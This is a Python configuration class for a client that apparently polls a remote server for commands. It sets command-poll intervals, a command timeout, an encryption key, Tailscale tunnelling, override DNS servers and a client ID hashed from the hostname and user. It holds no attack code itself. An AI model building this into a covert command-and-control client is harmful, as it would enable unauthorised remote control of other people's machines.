import os
import base64
import platform
import hashlib
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

class Config:
    # Connection Settings
    SERVER_URL = os.getenv("SERVER_URL", "https://default.server/api.php/")
    SECRET_TOKEN = os.getenv("SECRET_TOKEN", "default_token")
    CHECK_INTERVAL = 120  # seconds
    COMMAND_POLL_INTERVAL = 10  # seconds
    COMMAND_TIMEOUT = 5  # seconds
    IP_URL = os.getenv("IP_URL", "https://default.server/ip.php")
    UPDATE_URL = os.getenv("UPDATE_URL", "https://default.server/version.php")

    # Security Settings
    ENCRYPTION_KEY = base64.b64decode(os.getenv("ENCRYPTION_KEY", "dGVzdF9rZXk="))  # default is 'test_key' base64
    IV_LENGTH = 16
    BUFFER_LIMIT = 100000
    CLIENT_VERSION = "1.0"

    # System Settings
    EMERGENCY_HOTKEY = "ctrl+alt+shift+k"

    TAILSCALE_BINARY = os.getenv("TAILSCALE_BINARY", "tailscale.exe")
    TAILSCALE_AUTH_KEY = os.getenv("TAILSCALE_AUTH_KEY", "")
    PRIMARY_DNS = os.getenv("PRIMARY_DNS", "178.22.122.100")
    SECONDARY_DNS = os.getenv("SECONDARY_DNS", "185.51.200.2")

    # Debug Settings
    DEBUG_MODE = os.getenv("DEBUG_MODE", "false").lower() == "true"
    ERROR_LOG_FILE = os.getenv("ERROR_LOG_FILE", "errors.log")
    MAX_ERROR_LOG_SIZE = 1024 * 1024  # 1MB

    @staticmethod
    def get_client_id():
        unique_str = f"{platform.node()}-{os.getlogin()}"
        return hashlib.sha256(unique_str.encode()).hexdigest()[:32]
